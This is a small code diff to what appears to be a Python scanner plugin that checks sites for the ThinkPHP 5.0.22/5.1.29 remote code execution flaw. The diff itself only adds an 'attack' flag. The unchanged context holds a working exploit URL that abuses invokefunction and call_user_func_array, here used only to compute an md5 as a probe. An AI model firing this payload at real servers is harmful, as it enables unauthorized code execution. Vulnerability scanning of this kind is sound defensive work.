@@ -5,7 +5,8 @@ import urllib
 def verify(url):
     relsult = {
         'name': 'Thinkphp5 5.0.22/5.1.29 Remote Code Execution Vulnerability',
-        'vulnerable': False
+        'vulnerable': False,
+        'attack': True,
     }
     try:
         payload = urllib.parse.urljoin(url, r'''/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=1''')
